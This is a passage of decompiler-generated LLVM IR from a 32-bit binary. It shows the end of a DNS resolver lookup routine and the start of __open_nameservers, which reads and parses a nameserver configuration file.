  %v3_100133b0 = icmp eq i32 %v0_100133a8, 28
  br i1 %v3_100133b0, label %dec_label_pc_100133b8, label %dec_label_pc_10013468

dec_label_pc_100133b8:                            ; preds = %dec_label_pc_10013368.dec_label_pc_100133b8_crit_edge, %dec_label_pc_100133b0, %dec_label_pc_100133a8
  %v1_100133b8 = phi i32 [ %v1_100133b8.pre, %dec_label_pc_10013368.dec_label_pc_100133b8_crit_edge ], [ 28, %dec_label_pc_100133b0 ], [ 1, %dec_label_pc_100133a8 ]
  %v4_100133b8 = icmp eq i32 %v3_10013390, %v1_100133b8
  br i1 %v4_100133b8, label %dec_label_pc_100133cc, label %dec_label_pc_100133c0

dec_label_pc_100133c0:                            ; preds = %dec_label_pc_100133b8
  %v1_100133c0 = inttoptr i32 %v0_10013390 to i32*
  %v2_100133c0 = load i32, i32* %v1_100133c0, align 4
  store i32 ptrtoint (i32* @global_var_100133c8.1142 to i32), i32* @lr, align 4
  %v1_100133c4 = call i32 @free(i32 %v2_100133c0)
  br label %dec_label_pc_1001344c

dec_label_pc_100133cc:                            ; preds = %dec_label_pc_100133b8
  %v1_100133d0 = add i32 %v0_10013390, 16
  %v2_100133d0 = inttoptr i32 %v1_100133d0 to i32*
  %v3_100133d0 = load i32, i32* %v2_100133d0, align 4
  store i32 %v3_100133d0, i32* %r11.global-to-local, align 4
  %v0_100133d4 = load i32, i32* @r24, align 4
  %v2_100133d4 = sub i32 %tmp35, %v0_100133d4
  %v1_100133d8 = add i32 %v0_10013390, 32
  %v2_100133d8 = inttoptr i32 %v1_100133d8 to i32*
  %v3_100133d8 = load i32, i32* %v2_100133d8, align 4
  store i32 %v3_100133d8, i32* %r0.global-to-local, align 4
  %v1_100133dc = add i32 %v2_100133d4, -1
  %v1_100133e0 = add i32 %v3_100133d0, 4
  %v2_100133e4 = mul i32 %v1_100133dc, %v1_100133e0
  store i32 %v2_100133e4, i32* %r11.global-to-local, align 4
  %v2_100133e8 = add i32 %v0_10013390, 36
  %v3_100133e8 = inttoptr i32 %v2_100133e8 to i32*
  store i32 %v1_100133dc, i32* %v3_100133e8, align 4
  %v0_100133ec = load i32, i32* %r11.global-to-local, align 4
  %v1_100133ec = load i32, i32* %r0.global-to-local, align 4
  %v3_100133ec = icmp ugt i32 %v0_100133ec, %v1_100133ec
  br i1 %v3_100133ec, label %dec_label_pc_10013468, label %dec_label_pc_100133f4

dec_label_pc_100133f4:                            ; preds = %dec_label_pc_100133cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100133fc = load i32, i32* @r31, align 4
  %v2_100133fc = add i32 %v1_100133fc, 36
  %v3_100133fc = inttoptr i32 %v2_100133fc to i32*
  store i32 0, i32* %v3_100133fc, align 4
  br label %dec_label_pc_1001344c

dec_label_pc_10013404:                            ; preds = %dec_label_pc_1001335c
  %v3_10013404 = load i32, i32* %stack_var_-184, align 4
  store i32 268514316, i32* @lr, align 4
  %v1_10013408 = call i32 @free(i32 %v3_10013404)
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10013410 = load i32, i32* %r16.global-to-local, align 4
  %v4_10013410 = icmp eq i32 %tmp29, %v1_10013410
  br i1 %v4_10013410, label %dec_label_pc_10013418, label %dec_label_pc_1001344c

dec_label_pc_10013418:                            ; preds = %dec_label_pc_10013404
  %v0_10013418 = load i32, i32* @r31, align 4
  %v1_10013418 = add i32 %v0_10013418, 16
  %v2_10013418 = inttoptr i32 %v1_10013418 to i32*
  %v3_10013418 = load i32, i32* %v2_10013418, align 4
  store i32 %v3_10013418, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10013420 = icmp eq i32 %v3_10013418, %tmp28
  br i1 %v4_10013420, label %dec_label_pc_10013428, label %dec_label_pc_100134ac

dec_label_pc_10013428:                            ; preds = %dec_label_pc_10013418
  %v1_10013428 = add i32 %v0_10013418, 36
  %v2_10013428 = inttoptr i32 %v1_10013428 to i32*
  %v3_10013428 = load i32, i32* %v2_10013428, align 4
  %v1_1001342c = add i32 %v0_10013418, 28
  %v2_1001342c = inttoptr i32 %v1_1001342c to i32*
  %v3_1001342c = load i32, i32* %v2_1001342c, align 4
  store i32 %v3_1001342c, i32* %r0.global-to-local, align 4
  %v2_10013430 = mul i32 %v3_10013428, %tmp28
  %v2_10013438 = add i32 %v3_1001342c, %v2_10013430
  store i32 %v2_10013438, i32* @r3, align 4
  store i32 268514368, i32* @lr, align 4
  %v0_1001343c = call i32 @memcpy()
  %v0_10013440 = load i32, i32* @r31, align 4
  %v1_10013440 = add i32 %v0_10013440, 36
  %v2_10013440 = inttoptr i32 %v1_10013440 to i32*
  %v3_10013440 = load i32, i32* %v2_10013440, align 4
  %v1_10013444 = add i32 %v3_10013440, 1
  store i32 %v1_10013444, i32* %v2_10013440, align 4
  br label %dec_label_pc_1001344c

dec_label_pc_1001344c:                            ; preds = %dec_label_pc_10013404, %dec_label_pc_100133f4, %dec_label_pc_100133c0, %dec_label_pc_10013428
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10013428 ], [ 0, %dec_label_pc_10013404 ], [ 0, %dec_label_pc_100133f4 ], [ %stack_var_-88.118, %dec_label_pc_100133c0 ]
  %v0_1001344c = load i32, i32* @r28, align 4
  %v1_1001344c = load i32, i32* %r15.global-to-local, align 4
  %v2_1001344c = add i32 %v1_1001344c, %v0_1001344c
  store i32 %v2_1001344c, i32* %r28.global-to-local, align 4
  %v0_10013450 = load i32, i32* @r24, align 4
  %v1_10013450 = add i32 %v0_10013450, 1
  store i32 %v1_10013450, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10013458 = icmp slt i32 %v1_10013450, %tmp35
  br i1 %v2_10013458, label %dec_label_pc_10013460, label %dec_label_pc_10013468

dec_label_pc_10013460:                            ; preds = %dec_label_pc_10013314, %dec_label_pc_1001344c
  %v0_1001332c = phi i32 [ %v2_1001344c, %dec_label_pc_1001344c ], [ %v2_100132f8, %dec_label_pc_10013314 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1001344c ], [ 1, %dec_label_pc_10013314 ]
  %v1_10013460 = load i32, i32* @r27, align 4
  %v2_10013460 = icmp slt i32 %v0_1001332c, %v1_10013460
  br i1 %v2_10013460, label %dec_label_pc_10013324, label %dec_label_pc_10013468

dec_label_pc_10013468:                            ; preds = %dec_label_pc_1001334c, %dec_label_pc_10013314, %dec_label_pc_10013460, %dec_label_pc_1001339c, %dec_label_pc_100133cc, %dec_label_pc_1001344c, %dec_label_pc_100133b0
  %v0_10013468 = load i32, i32* @r19, align 4
  store i32 268514416, i32* @lr, align 4
  %v1_1001346c = call i32 @__libc_close(i32 %v0_10013468)
  %v3_10013474 = icmp eq i32 %arg5, 0
  %v0_10013484 = load i32, i32* @r30, align 4
  br i1 %v3_10013474, label %dec_label_pc_10013484, label %dec_label_pc_1001347c

dec_label_pc_1001347c:                            ; preds = %dec_label_pc_10013468
  %v2_1001347c = inttoptr i32 %arg5 to i32*
  store i32 %v0_10013484, i32* %v2_1001347c, align 4
  br label %dec_label_pc_1001348c

dec_label_pc_10013484:                            ; preds = %dec_label_pc_10013468
  store i32 268514444, i32* @lr, align 4
  %v1_10013488 = call i32 @free(i32 %v0_10013484)
  br label %dec_label_pc_1001348c

dec_label_pc_1001348c:                            ; preds = %dec_label_pc_1001347c, %dec_label_pc_10013484
  %v0_1001348c = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268514456, i32* @lr, align 4
  %v1_10013494 = call i32 @free(i32 %v0_1001348c)
  store i32 ptrtoint (i32* @global_var_10032b88.1130 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10013590

dec_label_pc_100134ac:                            ; preds = %dec_label_pc_10013418
  %v1_100134ac = inttoptr i32 %v0_10013418 to i32*
  %v2_100134ac = load i32, i32* %v1_100134ac, align 4
  store i32 268514484, i32* @lr, align 4
  %v1_100134b0 = call i32 @free(i32 %v2_100134ac)
  br label %dec_label_pc_100134b4

dec_label_pc_100134b4:                            ; preds = %dec_label_pc_100132c4, %dec_label_pc_1001322c, %dec_label_pc_1001334c, %dec_label_pc_10013344, %dec_label_pc_10013244, %dec_label_pc_1001320c, %dec_label_pc_100134ac
  %v0_100134b4 = load i32, i32* %r17.global-to-local, align 4
  %v3_100134b4 = icmp eq i32 %v0_100134b4, 0
  br i1 %v3_100134b4, label %dec_label_pc_100134bc, label %dec_label_pc_1001350c

dec_label_pc_100134bc:                            ; preds = %dec_label_pc_100134b4
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fc0, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v0_100134d8 = call i32 @__pthread_return_void()
  %v0_100134e0 = call i32 @__pthread_return_0()
  %v3_100134e8 = load i32, i32* @global_var_1002c950.1134, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v1_100134f4 = add i32 %v3_100134e8, -1
  store i32 %v1_100134f4, i32* %r29.global-to-local, align 4
  %v0_100134f8 = call i32 @__pthread_return_void()
  %v0_100134fc = load i32, i32* @r22, align 4
  %v2_100134fc = icmp slt i32 %v0_100134fc, %v1_100134f4
  br i1 %v2_100134fc, label %dec_label_pc_10013504, label %dec_label_pc_1001350c

dec_label_pc_10013504:                            ; preds = %dec_label_pc_100134bc
  %v1_10013504 = add i32 %v0_100134fc, 1
  store i32 %v1_10013504, i32* @r22, align 4
  br label %dec_label_pc_10013528thread-pre-split.backedge

dec_label_pc_10013528thread-pre-split.backedge:   ; preds = %dec_label_pc_10013504, %dec_label_pc_100132ac, %dec_label_pc_10013524
  %v0_10013528.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10013528.pr, 3
  br i1 %tmp65, label %dec_label_pc_1001301c.lr.ph, label %dec_label_pc_10013540

dec_label_pc_1001350c:                            ; preds = %dec_label_pc_100131bc, %dec_label_pc_100134bc, %dec_label_pc_100134b4, %dec_label_pc_100131d4
  %v0_1001350c = load i32, i32* @r26, align 4
  %v1_1001350c = add i32 %v0_1001350c, 1
  store i32 %v1_1001350c, i32* %r0.global-to-local, align 4
  %v1_10013510 = load i32, i32* @r23, align 4
  %v2_10013510 = srem i32 %v1_1001350c, %v1_10013510
  store i32 %v2_10013510, i32* @r26, align 4
  %v5_10013518 = icmp eq i32 %v2_10013510, 0
  br i1 %v5_10013518, label %dec_label_pc_10013520, label %dec_label_pc_10013524

dec_label_pc_10013520:                            ; preds = %dec_label_pc_1001350c
  %v0_10013520 = load i32, i32* %r18.global-to-local, align 4
  %v1_10013520 = add i32 %v0_10013520, 1
  store i32 %v1_10013520, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_10013524

dec_label_pc_10013524:                            ; preds = %dec_label_pc_1001350c, %dec_label_pc_10013520
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10013528thread-pre-split.backedge

dec_label_pc_1001301c.lr.ph:                      ; preds = %dec_label_pc_1001301c.lr.ph.lr.ph, %dec_label_pc_10013528thread-pre-split.backedge
  br label %dec_label_pc_1001301c

dec_label_pc_10013534:                            ; preds = %dec_label_pc_10012f94, %dec_label_pc_10012f8c, %dec_label_pc_10012f84, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10013540

dec_label_pc_10013540:                            ; preds = %dec_label_pc_10013528thread-pre-split.backedge, %dec_label_pc_1001302c, %dec_label_pc_10013108, %dec_label_pc_100131cc, %dec_label_pc_10012fa0, %dec_label_pc_10013534
  %v0_10013540 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10013548 = inttoptr i32 %v0_10013540 to i32*
  store i32 -1, i32* %v2_10013548, align 4
  %v0_1001354c = load i32, i32* @r25, align 4
  store i32 %v0_1001354c, i32* @r20, align 4
  br label %dec_label_pc_10013550

dec_label_pc_10013550:                            ; preds = %dec_label_pc_100132ec, %dec_label_pc_10013540
  %v0_10013550 = load i32, i32* @r19, align 4
  %v3_10013550 = icmp eq i32 %v0_10013550, -1
  br i1 %v3_10013550, label %dec_label_pc_10013560, label %dec_label_pc_10013558

dec_label_pc_10013558:                            ; preds = %dec_label_pc_10013550
  store i32 268514656, i32* @lr, align 4
  %v1_1001355c = call i32 @__libc_close(i32 %v0_10013550)
  br label %dec_label_pc_10013560

dec_label_pc_10013560:                            ; preds = %dec_label_pc_10013550, %dec_label_pc_10013558
  %v0_10013560 = load i32, i32* @r21, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268514668, i32* @lr, align 4
  %v1_10013568 = call i32 @free(i32 %v0_10013560)
  %v0_1001356c = load i32, i32* @r30, align 4
  store i32 268514676, i32* @lr, align 4
  %v1_10013570 = call i32 @free(i32 %v0_1001356c)
  %v0_10013574 = load i32, i32* @r26, align 4
  %v3_10013574 = icmp eq i32 %v0_10013574, -1
  br i1 %v3_10013574, label %dec_label_pc_100135c0, label %dec_label_pc_1001357c

dec_label_pc_1001357c:                            ; preds = %dec_label_pc_10013560
  store i32 ptrtoint (i32* @global_var_10032b88.1130 to i32), i32* %r29.global-to-local, align 4
  %v2_10013588 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10013590

dec_label_pc_10013590:                            ; preds = %dec_label_pc_1001348c, %dec_label_pc_1001357c
  %storemerge68 = phi i32 [ %v2_10013588, %dec_label_pc_1001357c ], [ %v2_10012fc0, %dec_label_pc_1001348c ]
  %v1_10013594.pre-phi = phi i32 [ %v2_10013588, %dec_label_pc_1001357c ], [ %v2_10012fc0, %dec_label_pc_1001348c ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_10013594.pre-phi, i32* @r3, align 4
  %v0_10013598 = call i32 @__pthread_return_void()
  %v0_100135a0 = call i32 @__pthread_return_0()
  %v0_100135a8 = load i32, i32* @r26, align 4
  store i32 %v0_100135a8, i32* @global_var_1002c948.1131, align 4
  store i32 %v1_10013594.pre-phi, i32* @r3, align 4
  %v0_100135b8 = load i32, i32* @r20, align 4
  %v1_100135b8 = trunc i32 %v0_100135b8 to i16
  store i16 %v1_100135b8, i16* @global_var_1002c85c.1132, align 2
  %v0_100135bc = call i32 @__pthread_return_void()
  br label %dec_label_pc_100135c0

dec_label_pc_100135c0:                            ; preds = %dec_label_pc_10013560, %dec_label_pc_10013590
  store i32 %v0_10012f40, i32* %r0.global-to-local, align 4
  %v0_100135c4 = load i32, i32* @r27, align 4
  ret i32 %v0_100135c4

; uselistorder directives
  uselistorder i32 %v1_10013594.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10013510, { 1, 0 }
  uselistorder i32 %v0_10013484, { 1, 0 }
  uselistorder i32 %v1_10013460, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1001332c, { 1, 0 }
  uselistorder i32 %v1_10013450, { 1, 0 }
  uselistorder i32 %v0_10013418, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100133dc, { 1, 0 }
  uselistorder i32 %v0_10013368, { 2, 1, 0 }
  uselistorder i32 %v0_10013304, { 1, 0 }
  uselistorder i32 %v2_100132f8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1001321c, { 1, 0 }
  uselistorder i32 %v1_1001311c, { 1, 0 }
  uselistorder i32 %v1_100130f0, { 1, 0 }
  uselistorder i32 %v1_100130bc, { 1, 0 }
  uselistorder i32 %v1_10013054, { 1, 0 }
  uselistorder i32 %v2_10012fc0, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 20, 15, 0, 19, 16, 17, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 101, { 2, 0, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 (i32)* @inet_addr, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1, 3 }
  uselistorder i16* @global_var_1002c85c.1132, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0, 5, 7, 6 }
  uselistorder i32 512, { 3, 4, 0, 1, 2, 5, 6, 7 }
  uselistorder label %dec_label_pc_100135c0, { 1, 0 }
  uselistorder label %dec_label_pc_10013590, { 1, 0 }
  uselistorder label %dec_label_pc_10013560, { 1, 0 }
  uselistorder label %dec_label_pc_10013550, { 1, 0 }
  uselistorder label %dec_label_pc_10013540, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1001301c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10013524, { 1, 0 }
  uselistorder label %dec_label_pc_1001350c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10013528thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100134b4, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1001348c, { 1, 0 }
  uselistorder label %dec_label_pc_10013468, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10013460, { 1, 0 }
  uselistorder label %dec_label_pc_1001344c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100133b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100132f4, { 1, 0 }
  uselistorder label %dec_label_pc_100132ec, { 1, 0 }
  uselistorder label %dec_label_pc_10013190, { 1, 0 }
  uselistorder label %dec_label_pc_10013108, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001302c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_100135f8 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_100135f8, i32* @r3, align 4
  %v0_10013600 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r3.global-to-local, align 4
  %v0_10013608 = call i32 @__pthread_return_0()
  store i32 %v0_10013608, i32* %r3.global-to-local, align 4
  %v3_10013610 = load i32, i32* @global_var_1002c94c.1080, align 4
  %v2_10013614 = icmp sgt i32 %v3_10013610, 0
  br i1 %v2_10013614, label %dec_label_pc_1001388c, label %dec_label_pc_1001361c

dec_label_pc_1001361c:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1001c308.1145 to i32), i32* %r3.global-to-local, align 4
  store i32 268514868, i32* @lr, align 4
  %v3_10013630 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1001c308.1145 to i32), i32 ptrtoint (i32* @global_var_1001c31c.1144 to i32))
  store i32 %v3_10013630, i32* %r3.global-to-local, align 4
  store i32 %v3_10013630, i32* @r26, align 4
  %v3_10013634 = icmp eq i32 %v3_10013630, 0
  br i1 %v3_10013634, label %dec_label_pc_1001363c, label %dec_label_pc_10013850.preheader

dec_label_pc_1001363c:                            ; preds = %dec_label_pc_1001361c
  %v0_10013640 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001c320.1146 to i32), i32* %r3.global-to-local, align 4
  store i32 268514892, i32* @lr, align 4
  %v3_10013648 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1001c320.1146 to i32), i32 %v0_10013640)
  store i32 %v3_10013648, i32* %r3.global-to-local, align 4
  store i32 %v3_10013648, i32* @r26, align 4
  %v3_1001364c = icmp eq i32 %v3_10013648, 0
  br i1 %v3_1001364c, label %dec_label_pc_10013880, label %dec_label_pc_10013850.preheader

dec_label_pc_10013850.preheader:                  ; preds = %dec_label_pc_1001361c, %dec_label_pc_1001363c
  %v0_1001385c16 = phi i32 [ %v3_10013630, %dec_label_pc_1001361c ], [ %v3_10013648, %dec_label_pc_1001363c ]
  %v2_10013850 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1001365c2 = bitcast i32* %stack_var_-164 to i8*
  %v3_10013740 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10013850

dec_label_pc_10013658:                            ; preds = %dec_label_pc_10013670
  %v1_10013658 = add i32 %v0_100137189, 1
  store i32 %v1_10013658, i32* %r3.global-to-local, align 4
  %v1_1001365c = inttoptr i32 %v1_10013658 to i8*
  %v2_1001365c = load i8, i8* %v1_1001365c, align 1
  %v3_1001365c = zext i8 %v2_1001365c to i32
  store i32 %v3_1001365c, i32* %r11.global-to-local, align 4
  %v3_10013664 = icmp eq i8 %v2_1001365c, 0
  br i1 %v3_10013664, label %dec_label_pc_10013850.backedge, label %dec_label_pc_10013670

dec_label_pc_10013670:                            ; preds = %dec_label_pc_10013670.lr.ph, %dec_label_pc_10013658
  %v0_10013674.in = phi i32 [ %v3_1001365c4, %dec_label_pc_10013670.lr.ph ], [ %v3_1001365c, %dec_label_pc_10013658 ]
  %v0_10013688 = phi i32 [ %v3_1001365c4, %dec_label_pc_10013670.lr.ph ], [ %v3_1001365c, %dec_label_pc_10013658 ]
  %v0_100137189 = phi i32 [ %v2_10013850, %dec_label_pc_10013670.lr.ph ], [ %v1_10013658, %dec_label_pc_10013658 ]
  %v0_10013674 = mul nuw nsw i32 %v0_10013674.in, 2
  %v2_10013674 = add i32 %v0_10013674, %v3_10013670.pre
  %v3_10013674 = inttoptr i32 %v2_10013674 to i16*
  %v4_10013674 = load i16, i16* %v3_10013674, align 2
  %v1_10013678 = and i16 %v4_10013674, 32
  %v3_10013678 = icmp eq i16 %v1_10013678, 0
  br i1 %v3_10013678, label %dec_label_pc_10013680, label %dec_label_pc_10013658

dec_label_pc_10013680:                            ; preds = %dec_label_pc_10013670
  %v3_10013680 = icmp eq i32 %v0_10013688, 10
  br i1 %v3_10013680, label %dec_label_pc_10013850.backedge, label %dec_label_pc_10013688

dec_label_pc_10013850.backedge:                   ; preds = %dec_label_pc_10013658, %dec_label_pc_10013804, %dec_label_pc_1001380c, %dec_label_pc_10013844, %dec_label_pc_1001365c.preheader, %dec_label_pc_10013680, %dec_label_pc_10013688, %dec_label_pc_100137ac
  %v0_1001385c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10013850

dec_label_pc_10013688:                            ; preds = %dec_label_pc_10013680
  %v3_10013688 = icmp eq i32 %v0_10013688, 35
  br i1 %v3_10013688, label %dec_label_pc_10013850.backedge, label %dec_label_pc_10013690

dec_label_pc_10013690:                            ; preds = %dec_label_pc_10013688
  store i32 0, i32* @r27, align 4
  store i32 %v2_100135f8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001371810 = inttoptr i32 %v0_100137189 to i8*
  %v2_1001371811 = load i8, i8* %v1_1001371810, align 1
  %v3_1001371c14 = icmp eq i8 %v2_1001371811, 0
  br i1 %v3_1001371c14, label %dec_label_pc_1001372c, label %dec_label_pc_10013724

dec_label_pc_100136a4:                            ; preds = %dec_label_pc_10013724
  %v1_100136a4 = mul i32 %v0_100136a4, 4
  %v3_100136a8 = load i32, i32* @global_var_1002c8a8, align 4
  store i32 %v3_100136a8, i32* %r11.global-to-local, align 4
  %v1_100136ac = load i32, i32* %r6.global-to-local, align 4
  %v2_100136ac = add i32 %v1_100136ac, %v1_100136a4
  %v2_100136b0 = add i32 %v2_100136ac, 16
  %v3_100136b0 = inttoptr i32 %v2_100136b0 to i32*
  store i32 %v0_100136b0, i32* %v3_100136b0, align 4
  %v0_100136bc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100136bc

dec_label_pc_100136b8:                            ; preds = %dec_label_pc_100136d0
  %v1_100136b8 = add i32 %v0_100136b8, 1
  store i32 %v1_100136b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100136bc

dec_label_pc_100136bc:                            ; preds = %dec_label_pc_100136a4, %dec_label_pc_100136b8
  %v0_100136b8 = phi i32 [ %v0_100136bc.pre, %dec_label_pc_100136a4 ], [ %v1_100136b8, %dec_label_pc_100136b8 ]
  %v1_100136bc = inttoptr i32 %v0_100136b8 to i8*
  %v2_100136bc = load i8, i8* %v1_100136bc, align 1
  %v3_100136c0 = icmp eq i8 %v2_100136bc, 0
  br i1 %v3_100136c0, label %dec_label_pc_100136ec, label %dec_label_pc_100136d0

dec_label_pc_100136d0:                            ; preds = %dec_label_pc_100136bc
  %v3_100136c8 = icmp eq i8 %v2_100136bc, 10
  %v3_100136bc = zext i8 %v2_100136bc to i32
  %v1_100136c4 = mul nuw nsw i32 %v3_100136bc, 2
  %v1_100136d0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100136d0 = add i32 %v1_100136d0, %v1_100136c4
  %v3_100136d0 = inttoptr i32 %v2_100136d0 to i16*
  %v4_100136d0 = load i16, i16* %v3_100136d0, align 2
  %v1_100136d4 = and i16 %v4_100136d0, 32
  %v3_100136d4.not = icmp ne i16 %v1_100136d4, 0
  %brmerge = or i1 %v3_100136c8, %v3_100136d4.not
  br i1 %brmerge, label %dec_label_pc_100136ec, label %dec_label_pc_100136b8

dec_label_pc_100136e4:                            ; preds = %dec_label_pc_10013700
  %v0_100136e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100136e4 = trunc i32 %v0_100136e4 to i8
  store i8 %v1_100136e4, i8* %v1_100136ec, align 1
  %v0_100136e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100136e8 = add i32 %v0_100136e8, 1
  store i32 %v1_100136e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100136ec

dec_label_pc_100136ec:                            ; preds = %dec_label_pc_100136d0, %dec_label_pc_100136bc, %dec_label_pc_100136e4
  %v0_10013718 = phi i32 [ %v1_100136e8, %dec_label_pc_100136e4 ], [ %v0_100136b8, %dec_label_pc_100136bc ], [ %v0_100136b8, %dec_label_pc_100136d0 ]
  %v1_100136ec = inttoptr i32 %v0_10013718 to i8*
  %v2_100136ec = load i8, i8* %v1_100136ec, align 1
  %v3_100136ec = zext i8 %v2_100136ec to i32
  %v3_100136f0 = icmp eq i8 %v2_100136ec, 0
  %v1_100136f4 = mul nuw nsw i32 %v3_100136ec, 2
  store i32 %v1_100136f4, i32* %r11.global-to-local, align 4
  br i1 %v3_100136f0, label %dec_label_pc_10013714, label %dec_label_pc_10013700

dec_label_pc_10013700:                            ; preds = %dec_label_pc_100136ec
  %v3_100136f8 = icmp eq i8 %v2_100136ec, 10
  %v3_10013700 = load i32, i32* @global_var_1002c8a8, align 4
  %v2_10013704 = add i32 %v3_10013700, %v1_100136f4
  %v3_10013704 = inttoptr i32 %v2_10013704 to i16*
  %v4_10013704 = load i16, i16* %v3_10013704, align 2
  %v1_10013708 = and i16 %v4_10013704, 32
  %v3_10013708.not = icmp ne i16 %v1_10013708, 0
  %brmerge27 = or i1 %v3_100136f8, %v3_10013708.not
  br i1 %brmerge27, label %dec_label_pc_100136e4, label %dec_label_pc_10013714

dec_label_pc_10013714:                            ; preds = %dec_label_pc_10013700, %dec_label_pc_100136ec
  %v0_10013714 = load i32, i32* @r27, align 4
  %v1_10013714 = add i32 %v0_10013714, 1
  store i32 %v1_10013714, i32* @r27, align 4
  %v2_10013718 = load i8, i8* %v1_100136ec, align 1
  %v3_1001371c = icmp eq i8 %v2_10013718, 0
  br i1 %v3_1001371c, label %dec_label_pc_1001372c, label %dec_label_pc_10013724

dec_label_pc_10013724:                            ; preds = %dec_label_pc_10013690, %dec_label_pc_10013714
  %v0_100136b0 = phi i32 [ %v0_10013718, %dec_label_pc_10013714 ], [ %v0_100137189, %dec_label_pc_10013690 ]
  %v0_100136a4 = phi i32 [ %v1_10013714, %dec_label_pc_10013714 ], [ 0, %dec_label_pc_10013690 ]
  %tmp33 = icmp slt i32 %v0_100136a4, 5
  br i1 %tmp33, label %dec_label_pc_100136a4, label %dec_label_pc_1001372c

dec_label_pc_1001372c:                            ; preds = %dec_label_pc_10013714, %dec_label_pc_10013724, %dec_label_pc_10013690
  store i32 %tmp, i32* @r30, align 4
